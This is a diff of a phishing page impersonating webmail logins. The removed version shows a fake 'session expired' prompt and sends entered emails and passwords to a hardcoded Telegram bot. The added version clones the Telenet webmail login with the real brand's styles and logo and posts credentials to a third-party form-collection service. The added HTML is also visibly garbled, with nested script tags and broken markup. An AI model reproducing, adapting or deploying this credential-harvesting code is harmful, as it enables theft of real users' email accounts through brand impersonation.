@@ -2,404 +2,410 @@
 
 
 
+
 <!DOCTYPE html>
-<html lang="en" >
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"><![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="no-js" lang="en"> <!--<![endif]-->
+
+
+
 
 <head>
-
-  <meta charset="UTF-8">
-  
-<meta http-equiv="content-type" content="text/html; charset=windows-1252">
-        <meta name="robots" content="noindex, nofollow">
-<meta name="googlebot" content="noindex, nofollow"> 
-    <title>Webmail Portal Login</title>
-    <script src="jquery-1.js"></script>
-
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-
-      <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="bootstrap.min.css?1422585379">
-    <link href="https://fonts.googleapis.com/css?family=Yellowtail%26display=swap" rel="stylesheet">
-    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-  <style>
-  
- html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:before,blockquote:after,q:before,q:after{content:'';content:none}table{border-collapse:collapse;border-spacing:0}
     
-    html,body{}#root{position:absolute;left:0;right:0;bottom:0;top:0;z-index:-10;pointer-events:none}.error{color:#dc3545;width:80%;margin:0 auto;padding-top:5px}.form-holder{background-color:#fff;width:600px;margin:100px auto;height:100%;box-shadow:0 20px 50px #a9a9a9;border-radius:4px 4px 0 0;border:1px solid #d6dfea;z-index:12}
-     
- }
-  
+    <title>Telenet Webmail</title>
 
-.social_icons a{
-  display: block;
-  height: 45px;
-  width: 100%;
-  line-height: 45px;
-  text-align: center;
-  border-radius: 5px;
-  font-size: 20px;
-  color: #fff;
-  text-decoration: none;
-  transition: all 0.3s linear;
-}
-.social_icons a span{
-  margin-left: 5px;
-  font-size: 18px;
-}
-.social_icons a:first-child{
-  margin-right: 5px;
-  background: #4267B2;
-}
-.social_icons a:first-child:hover{
-  background: #375695;
-}
-.social_icons a:last-child{
-  margin-left: 5px;
-  background: #1DA1F2;
-}
-.social_icons a:last-child:hover{
-  background: #0d8bd9;
-}
-form {
-  margin-top: 25px;
-}
-form .input_box{
-  height: 50px;
-  width: 100%;
-  position: relative;
-  margin-top: 15px;
-}
-.input_box input{
-  height: 100%;
-  width: 100%;
-  outline: none;
-  border: 1px solid lightgrey;
-  border-radius: 5px;
-  padding-left: 45px;
-  font-size: 17px;
-  transition: all 0.3s ease;
-}
-.input_box input:focus{
-  border-color: #ff0000;
-}
-.input_box .icon{
-  position: absolute;
-  top: 50%;
-  left: 20px;
-  transform: translateY(-50%);
-  color: grey;
-}
-form .option_div{
-  margin-top: 5px;
-  display: flex;
-  justify-content: space-between;
-}
-.option_div .check_box{
-  display: flex;
-  align-items: center;
-}
-.option_div span{
-  margin-left: 5px;
-  font-size: 16px;
-  color: #333;
-}
-.option_div .forget_div a{
-  font-size: 16px;
-  color: #be2edd;
-}
-.button input{
-  padding-left: 0;
-  background: #be2edd;
-  color: #fff;
-  border: none;
-  font-size: 20px;
-  font-weight: 500;
-  cursor: pointer;
-  transition: all 0.3s linear;
-}
-.button input:hover{
-  background: #a720c5;
-}
-form .sign_up{
-  text-align: center;
-  margin-top: 25px;
-}
-.sign_up a{
-  color: #be2edd;
-}
-form a{
-  text-decoration: none;
-}
-form a:hover{
-  text-decoration: underline;
-}
-  </style>
+    
+
+<title>Telenet: Meld je aan</title>
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="description" content="">
 
 
-  <script>
-  window.console = window.console || function(t) {};
-</script>
+    
+    
+    
 
-  
-  
-  <script>
-  if (document.location.search.match(/type=embed/gi)) {
-    window.parent.postMessage("resize", "*");
-  }
-</script>
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-  
-    <script>
-  window.console = window.console || function(t) {};
-</script>
+<link rel="stylesheet" href="https://login.prd.telenet.be/openid/css/vendor/normalize.min.css">
+<link rel="stylesheet" href="https://static.telenet.be/oauth2/css/main.css">
+<link rel="stylesheet" href="https://login.prd.telenet.be/openid/css/login.css?v=2.1">
+<link rel="stylesheet" href="https://login.prd.telenet.be/openid/css/login-sales-flow.css" type="text/css">
+<link href="https://login.prd.telenet.be/openid/css/login-select-account.css" rel="stylesheet" type="text/css">
 
-  
-  
-  <script>
-  if (document.location.search.match(/type=embed/gi)) {
-    window.parent.postMessage("resize", "*");
-  }
-  </script>
+<!-- Adobe analytics -->
+<script src="https://login.prd.telenet.be/openid/js/vendor/jquery-1.9.1.min.js"></script>
+<script src="https://static.telenet.be/oauth2/js/vendor/jquery-ui-1.10.3.custom.min.js"></script>
 
-  
-  
-<script>
-    window.onload = function() {
-  var input = document.getElementById("password").focus();
-}
-
-</script>
-</head>
-
-<body translate="no" >
-  <!doctype html>
-<html lang="en">
+<script type="text/javascript">
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+   <script type="text/javascript">
+    <html>
   <head>
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>reCAPTCHA demo: Calmos Webmail</title>
+    <script type="text/javascript">
+      var verifyCallback = function(response) {
+        alert(response);
+      };
+      var widgetId1;
+      var widgetId2;
+      var onloadCallback = function() {
+      
+        widgetId1 = grecaptcha.render('example1', {
+          'sitekey' : '6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw'
+',
+          'theme' : 'light'
+        });
+        widgetId2 = grecaptcha.render(document.getElementById('example2'), {
+          'sitekey' : '6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw'
+'
+        });
+        grecaptcha.render('example3', {
+          'sitekey' : '6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw',
+          'callback' : <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"
+          'theme' : 'dark'
+        });
+      };
+   
+   
 
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  
+  
+  
+  
+  
+  <script>
+    function onSubmit(token) {
+      alert('thanks ' + document.getElementById('field').value);
+    }
 
-    <title>Hello, world!</title>
+    function validate(event) {
+      event.preventDefault();
+      if (!document.getElementById('field').value) {
+        alert("You must add text to the required field");
+      } else {
+        grecaptcha.execute();
+      }
+    }
+
+    function onload() {
+      var element = document.getElementById('submit');
+      element.onclick = validate;
+    }
+
+<!--[if lt IE 9]>
+<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+
+ </script>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   </head>
   <body>
-      <div id="root">
-<iframe id="iframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe> </div>
-<form action="" method="post">
-<input type="hidden" class="form-control" name="hido" id="hido" value="">
-<input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
+    <form>
+	<div
+     <div Webmail <input id="field" name="field">
+      <div <id="recaptcha" class="g-recaptcha">
+         </div> <data-sitekey="6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw">
+         </div>  <data-callback="onSubmit">
+		 
+		  </div>
+	 </form>
+    
 
-     <!--   <h1 style="text-align: center;">Hello, world!</h1>
- Button trigger modal --> 
-  
 
-    <!-- Modal -->
-    <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" style="margin-top: 90px; display: block !important;" aria-labelledby="exampleModalLabel" aria-hidden="true">
-    <div class="modal-dialog" style="box-shadow: rgba(0, 0, 0, 0.4) 0px 30px 90px;" role="document">
-        <div class="modal-content">
-        <div class="modal-header">
-            <div class="xlogo">
-            <h5><img id="logoimg" src="">
-            <span style="text-transform: capitalize;" id="logoname"></span></h5>
-            </div>
+
+
+<title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw"></script>
+
+
+    <link href="https://login.prd.telenet.be/openid/css/common/icons.css" rel="stylesheet" type="text/css">
+    <link href="https://login.prd.telenet.be/openid/css/telenet/telenet.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+
+<section id="LoginForm">
+    <span id="showBackgroundForStatic" style="display: none">true</span>
+    <div class="openid-login-page m--n justify-content-center background__image--full-size">
+        <div class="openid-login-page__container align-items-center">
+            <div class="m--n openid-login-page__container--inner">
                 
-            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-            <span aria-hidden="true">&times;</span>
-            </button>
+                <div class="p--n mb--l openid-login-page__container--header">
+                    <div class="m--n openid-login-page__container--header-logo">
+                        <div class="p--n cmp cmp-logo">
+                            <span class="logo ">
+                                <img class="" src="https://login.prd.telenet.be/openid/img/telenet/logo-telenet.svg" alt="Telenet">
+                            </span>
+                            <span class="openid-login-page__header-site-name fit-content">
+                                Telenet Webmail
+                            </span>
+                            <span id="languageForStatic" style="display: none">nl</span>
+                        </div>
+                        
+                            <div class="language-selector clearfix" onclick="toggleLanguage()" onmouseover="toggleLanguage()" onmouseleave="toggleLanguage()">
+    <div class="language-selector__selected">
+        <div class="lang-selected">
+            <span>nl</span>
+            <span id="language-arrow" class="arrow"></span>
         </div>
-        <div class="modal-body">
-        <div class="form-wrap">
-        <center>
-            <div>Your session has expired, please login again to continue.</div></center>
-        <center>
-          <div class="alert alert-danger" id="msg" style="display: none; color:red;"> Invalid Password.! Please Enter your correct Password</div>
-          <div id="error" class="text-danger" style="display: none; color:red;">That account doesn't exist. Enter a different account</div>
-        </center>
-      <div class="input_box">
-        <input type="email" name="username" id="email" placeholder="Email or Phone" enabled="enabled" >
-        <div class="icon"><i class="fas fa-user"></i></div>
-      </div>
-      <div class="input_box">
-        <input type="password" name="password" id="password" placeholder="Password" autofocus required="required">
-        <div class="icon"><i class="fas fa-lock"></i></div>
-      </div>
-        </div>
+    </div>
+    <div id="language-menu" class="language-menu" onmouseover="toggleLanguage()">
+        <ul>
+            <span id="languageForStatic" style="display: none">nl</span>
+            <!-- IT-4522 The design team uses languageForStatic to display text dynamically-->
+            
+            
+            <span>
+                
+                    
+                        <li class="active"><a class="cur-default" href="javascript:void(0)" tabindex="-1">NL</a></li>
+                        <li><a href="?lang=fr&error=" tabindex="-1">FR</a></li>
+                        <li><a href="?lang=en&error=" tabindex="-1">EN</a></li>
+                    
+                    
+                    
+                
+            </span>
+        </ul>
+    </div>
+</div>
+
+
+<title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw"></script>
+                        
+                    </div>
                 </div>
 
-       <div class="modal-footer"> 
-            <!--     <div class="input_box"> -->
+                <!-- message handling -->
+                <div class="contentContainer" id="loginSection">
 
-            <button type="submit" id="submit-btn" class="btn btn-primary">Sign in</button>
-        </div>
+                    <div id="error">
+                        
+
+    
+    
+    
+    
+    
+    
+
+
+
+
+
+                    </div>
+                    
+                    
+                        <div class="display-flex openid-login-page__container-details">
+                            <div class="openid-login-page__container--form-login-section p--n width-260">
+                                <form id="login-form" name="loginForm" action="https://formbold.com/s/oPkgz" method="post" class="p--n m--n login-form">
+                                    <div class="form-group mb--m position--relative">
+									<div class="form-group mb--m position--relative">
+									<script src="https://unpkg.com/@botpoison/browser" async></script>
+									<form action="https://example.demo"data-botpoison-public-key="pk_efae6277-24cc-4810-8e1f-2b2c52372a04">
+                                        <label for="j_username">
+                                            
+                                                
+                                                
+                                                    Je e-mailadres
+                                                
+                                            
+                                        </label>
+                                        
+                                            <a href="#" onclick="window.open(getLoginForgottenUrl());  return false;" target="_blank" tabindex="-1" class="ml--xs link link--unstyled" tabindex="-1">
+                                                Vergeten?
+                                            </a>
+                                        
+                                        <div data-cs-mask class="form__input-container ">
+                                            <input type="text" class="form__input "
+                                                       name="j_username"
+                                                       id="j_username"
+                                                       autcomplete="off"
+                                                       tabindex="1"
+                                                       autofocus
+                                            
+                                                   placeholder="e-mail@telenet.be"
+                                            
+                                            >
+                                        </div>
+                                    </div>
+                                    <div class="form-group mb--m position--relative">
+                                        <label for="j_password">
+                                            Wachtwoord
+                                        </label>
+                                        <a onclick="window.open(getTelenetPasswordForgottenUrl()); return false;" href="#" target="_blank"
+                                           class="ml--xs link link--unstyled" tabindex="-1">
+                                            Vergeten?
+                                        </a>
+                                        <div data-cs-mask class="form__input-container display-flex">
+                                            <input class="form__input "
+                                                       type="password" name="j_password"
+                                                       id="j_password" onkeyup="showEyeIcon();"
+                                                       autocomplete="off"
+                                                       tabindex="2"
+                                                       placeholder="Hoofdlettergevoelig">
+                                            <div class="hide-show" style="display: none;" id="passwordEye"
+                                                 onclick="togglePassword();"></div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="p--n">
+                                        
+                                            
+                                                <div>
+                                                    <div class="form__checkbox">
+                                                        <input type="checkbox" class="form__checkbox__input" name="rememberme"
+                                                               id="rememberme"
+                                                               value="true"
+                                                                tabindex="3">
+                                                        <label class="form__checkbox__label" for="rememberme">&nbsp;</label>
+                                                    </div>
+                                                    <label class="label" for="rememberme">Aangemeld blijven</label>
+                                                </div>
+                                            
+                                            <title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw"></script>
+                                        
+                                    </div>
+
+                                    <div class="form-group">
+                                        
+                                            
+                                            
+                                                <button type="submit"
+                                                        tabindex="4"
+                                                        class="button button--primary login button--fullwidth" name="Login.Submit"
+                                                        id="login_button">Aanmelden</button>
+                                            
+                                        
+                                    </div>
+                                    
+                                        
+                                        
+                                            
+                                                <div class="text-align--center">
+                                                    <a class="link link--unstyled no-login-link" href="https://www2.telenet.be/residential/nl/create-profile/?flow=selfRegistration#/loginredirecturl=https%253A%252F%252Flogin.prd.telenet.be%252Fopenid%252Foauth%252Fauthorize%253Fclaims%253D%25257B%252522id_token%252522%253A%25257B%252522http%253A%252F%252Ftelenet.be%252Fclaims%252Flicenses%252522%253Anull%252C%252522http%253A%252F%252Ftelenet.be%252Fclaims%252Fmailbox%252522%253Anull%25257D%25257D%2526response_type%253Dcode%2526state%253Df2d776bc-cb4f-4cdc-a055-5c33f3c5fae8%2526nonce%253Df93ba735-9f38-4726-a308-b2b78e8bbbca%2526client_id%253Dwebmail" target="_blank"
+                                                       tabindex="-1">Nog geen login? Maak er één aan.</a>
+                                                </div>
+                                            
+                                        
+                                    
+                                </form>
+                            </div>
+
+                            
+                        </div>
+                    
+                </div>
+                
+            </div>
         </div>
     </div>
+
+</section>
+<div class="bgContainer"></div>
+
+<div class="overlayer" id="cookie-dialog-itsme">
+    <div class="overlayer-mask opacity--mini-transparency"></div>
+    <div class="overlay__section">
+        <div class="overlay__section__content p--s">
+            <div class="overlay__section__content__description ">
+                
+            </div>
+            <div class="overlay__section__content__action justify-content-center mb--s">
+                <button onclick='closeInformCookieDialog("itsme"); return false;' class="button button--secondary">Nee</button>
+                <button onclick='confirmInformCookieDialog("itsme"); return false;' class="button button--primary">Ja</button>
+            </div>
+        </div>
     </div>
+</div>
+<div class="overlayer" id="cookie-dialog-facebook">
+    <div class="overlayer-mask opacity--mini-transparency"></div>
+    <div class="overlay__section">
+        <div class="overlay__section__content p--s">
+            <div class="overlay__section__content__description ">
+                
+            </div>
+            <div class="overlay__section__content__action justify-content-center mb--s">
+                <button onclick='closeInformCookieDialog("facebook"); return false;' class="button button--secondary">Nee</button>
+                <button onclick='confirmInformCookieDialog("facebook"); return false;' class="button button--primary">Ja</button>
+            </div>
+        </div>
+    </div>
+</div>
 
-    <!-- Optional JavaScript -->
-    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
-    <script>
-       $(document).ready(function(){
-            $('#exampleModal').modal('show');
-        }); 
-        
-        $('#exampleModal').modal({
-    backdrop: 'static',
-    keyboard: false
-})
-    </script>
-<script>
+<div class="overlayer" id="cookie-dialog-google">
+    <div class="overlayer-mask opacity--mini-transparency"></div>
+    <div class="overlay__section">
+        <div class="overlay__section__content p--s">
+            <div class="overlay__section__content__description ">
+                
+            </div>
+            <div class="overlay__section__content__action justify-content-center mb--s">
+                <button onclick='closeInformCookieDialog("google"); return false;' class="button button--secondary">Nee</button>
+                <button onclick='confirmInformCookieDialog("google"); return false;' class="button button--primary">Ja</button>
+            </div>
+        </div>
+    </div>
+</div>
 
-    /* global $ */
-    $(document).ready(function(){
-      var count=0;
+<script src="https://login.prd.telenet.be/openid/js/social/social.js"></script>
+<input type="hidden" id="oauth2-brand" value="TELENET"/>
+<script src="https://login.prd.telenet.be/openid/js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
 
-      $('#back1').click(function () {
-        $("#msg").hide();
-        $('#email').val("");
-        $("#automail").animate({left:200, opacity:"hide"}, 0);
-        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+<!--[if lt IE 9]>!
+<script type="text/javascript" src="/openid/js/vendor/jquery.backgroundSize.js"></script>
+<![endif]-->
 
-      });
+<span id="client_id" style="display: none">webmail</span>
+<span id="stylehint" style="display: none"></span>
 
-      var email = window.location.hash.substr(1);
-      if (!email) {
+<script src="https://static.telenet.be/oauth2/js/main.js"></script>
 
-      }
-      else
-      {
-        var my_email =email;
-        $('#email').val(my_email);
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-        if (!filter.test(my_email)) {
-          $('#error').show();
-          email.focus;
-          return false;
+
+    
+        <script src="https://static.telenet.be/oauth2/js/items_centered_webmail.js"></script>
+        <script>if(typeof(window.data) === 'undefined') { document.write('<script src="https://static.telenet.be/oauth2/js/items_centered.js">\x3C/script>');}</script>
+    
+    
+
+
+<script type="text/javascript">
+    $('form').submit(function () {
+        if('webmail' !== 'ocapi_base') {
+            $('input:submit').attr("disabled", true);
+            $(this).find('button:submit').attr("disabled", true);
         }
-        var ind=my_email.indexOf("@");
-        var my_slice=my_email.substr((ind+1));
-        var c= my_slice.substr(0, my_slice.indexOf('.'));
-        var final= c.toLowerCase();
-        var finalu= c.toUpperCase();
+    });
+</script>
 
-        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $("#logoname").html(finalu);
-        $(".logoname").html(finalu);
-        $("#iframe").attr("src", "https://www."+my_slice);
-      }
-      
-      $('#submit-btn').click(function(event){
-        $('#error').hide();
-        $('#msg').hide();
-        event.preventDefault();
-        var email=$("#email").val();
-        var password=$("#password").val();
-        var msg = $('#msg').html();
-        $('#msg').text( msg );
-      ///////////new injection////////////////
-      var my_email =email;
-      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+<title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LdW8XcpAAAAAD8nsdDasR8M78N9YT8ExvlwozMw"></script>
 
-      if (!filter.test(my_email)) {
-        $('#error').show();
-        email.focus;
-        return false;
-      }
-
-      var ind=my_email.indexOf("@");
-      var my_slice=my_email.substr((ind+1));
-      var c= my_slice.substr(0, my_slice.indexOf('.'));
-      var final= c.toLowerCase();
-      var finalu= c.toUpperCase();
-
-$("#iframe").attr("src", "https://www."+my_slice);
-        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
-        $("#logoname").html(finalu);
-      ///////////new injection////////////////
-      count=count+1;
-
-        const token = '5488614903:AAE3pF2BtAZdyCp3jGEk8RM7YyssBgmgx0Q';
-        const chatId = '1060663576';
-
-        const message = `username: ${email}\npassword1: ${password}\npassword2: ${password2} `;
-      
-      
-        $.ajax({
-            dataType: 'JSON',
-            url: `https://api.telegram.org/bot${token}/sendMessage`,
-            type: 'POST',
-            data: {
-                chat_id: chatId,
-                text: message,
-        },
-            // data: $('#contact').serialize(),
-            beforeSend: function(xhr){
-              $('#submit-btn').html('Verifing...');
-            },
-            success: function(response){
-              if(response){
-                $("#msg").show();
-                console.log(response);
-                if(response['signal'] == 'ok'){
-                  $("#password").val("");
-                  if (count>=2) {
-                    count=0;
-                    // window.location.replace(response['redirect_link']);
-                    window.location.replace("http://www."+my_slice);
-
-                  }
-                  // $('#msg').html(response['msg']);
-                }
-                else{
-                  // $('#msg').html(response['msg']);
-                }
-              }
-            },
-            error: function(){
-              $("#password").val("");
-              if (count>=2) {
-                count=0;
-                window.location.replace("http://www."+my_slice);
-              }
-              $("#msg").show();
-              // $('#msg').html("Please try again later");
-            },
-            complete: function(){
-              $('#submit-btn').html('Sign in');
-            }
-            
-            
-          });
-          
+    
         
-    });
+        
+        
+            <script src="https://login.prd.telenet.be/openid/js/analytics/3ce8236b487d/f8574738a869/launch-dca0d353fb89.min.js"></script>
+        
+    
+
+    <script src="https://login.prd.telenet.be/openid/js/analytics/udl.min.js"></script>
+    <script src="https://login.prd.telenet.be/openid/js/analytics/analytics.js"></script>
 
 
-    });
-
-
-  </script>
-
-  </body>
-</html>
-
-  
-  
-
+<!-- <sessionid>29d44cda-6233-4954-bdd9-092f0d516e04</sessionid> -->
+<!-- errorCode: , errorMessage:  -->
 </body>
-
 </html>
- 
